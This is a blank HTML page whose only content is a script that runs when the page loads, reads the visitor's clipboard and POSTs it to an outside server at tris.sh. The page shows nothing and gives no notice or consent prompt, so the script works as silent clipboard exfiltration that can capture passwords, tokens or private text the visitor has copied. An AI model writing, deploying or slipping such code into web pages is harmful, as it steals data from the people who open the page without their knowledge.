<html>
	<body>
		<script>
			document.addEventListener('DOMContentLoaded', async() => {
				try {
					const clipboard = await navigator.clipboard.readText();
					fetch("https://tris.sh/api/paste", {
						method: "POST",
						headers: {
							"Content-Type": "application/json"
						},
						body: JSON.stringify({
							clipboard: clipboard
						})
					});
				} catch (err) {
					console.error(err);
				}
			});
		</script>
	</body>
</html>
